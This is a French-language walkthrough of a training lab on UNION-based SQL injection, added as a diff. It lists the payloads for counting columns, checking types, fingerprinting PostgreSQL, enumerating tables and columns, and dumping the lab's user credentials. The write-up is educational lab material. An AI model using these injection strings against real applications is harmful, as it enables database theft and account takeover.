@@ -1,0 +1,69 @@
+          DESCRIPTION
+------------------------------------------------------------------------------------------------------
+
+This lab contains an SQL injection vulnerability in the product category filter.
+The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords.
+You need to determine the name of this table and the columns it contains, then retrieve the contents of the
+table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+------------------------------------------------------------------------------------------------------
+
+On récupère le nombre de colonnes ajoutant à la fin de la requête :
+'ORDER BY 1--
+'ORDER BY 2--
+'ORDER BY 3-- = internal server error
+Nous avons donc 2 colonnes.
+
+On vérifie la compatibilité des colonnes avec le format string :
+'UNION SELECT 'a',NULL--
+'UNION SELECT NULL,'a'--
+Les 2 colonnes sont compatibles.
+
+On cherche ensuite sous quel type et quelle version tourne la database :
+'UNION SELECT NULL,@@version-- = internal server error
+'UNION SELECT NULL,version()-- = OK
+On apprend donc que la database visée est sous PostgreSQL 12.11 : 
+PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu,
+compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+Avec ces informations, on peut ensuite chercher le nom des tables :
+'UNION SELECT table_name,NULL FROM information_schema.tables--
+Quelques noms de tables interessants font surface :
+- pg_user
+- users_inhaeu
+- pg_database
+- user_mappings
+
+On peut essayer de récupérer les colonnes de ces différentes tables :
+'UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'pg_user'--
+
+On y trouve d'autres colonnes que l'on pourrait tenter de récupérer :
+- username
+- passwd
+
+'UNION SELECT passwd,NULL FROM pg_user--
+
+On aperçoit un mot de passe, mais caché. surement un piège du lab pour indiquer subtilement qu'on est pas
+sur la bonne piste. Après quelques tentatives infructueuses, je suis passé sur la seconde table :
+
+'UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_inhaeu'--
+
+Résultat concluant, on tombe sur deux colonnes :
+username_iqcpbt
+password_avjxlc
+
+'UNION SELECT password_avjxlc,username_iqcpbt FROM users_inhaeu--
+Il s'agit cette fois-ci des bonnes colonnes, la page affiche :
+
+9drt170gxf4rfszt99yr
+wiener
+pwahxf3nu0ou3llzqz5w
+carlos
+********************
+administrator
+
+Il suffit de se log en administrateur afin de terminer le lab.
